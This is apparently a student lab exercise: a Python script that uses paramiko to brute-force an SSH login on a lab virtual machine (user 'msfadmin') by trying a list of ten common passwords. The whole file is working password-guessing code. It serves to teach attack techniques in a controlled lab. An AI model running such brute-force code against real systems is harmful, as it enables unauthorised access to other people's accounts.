import paramiko
import sys
from datetime import datetime


author = "Dominic Whye"
current_date = datetime.now().strftime("%d/%m/%Y")
print(f"Author: {author}")
print(f"Date: {current_date}")

def ssh_connect(target_ip, username, password):
    #lab 6 q4 code snippet
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target_ip, username=username, password=password, timeout=5)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Error connecting to {target_ip}: {e}")
        return False
    finally:
        ssh.close()

if __name__ == "__main__":
    # targeting metas IP
    target = "10.0.2.3"
    user = "msfadmin"
    
    # list of 10 possible password
    password_list = [
        "123456", "password", "admin", "guest",
        "msfadmin", "root", "security", "uow2026",
        "hacking", "qwerty"
    ]

    print(f"[*] Starting SSH brute-force on {target} for user: {user}")

    for pwd in password_list:
        if ssh_connect(target, user, pwd):
            print(f"[+] Success! Valid password found: {pwd}")
            break
        else:
            print(f"[-] Attempt failed for: {pwd}")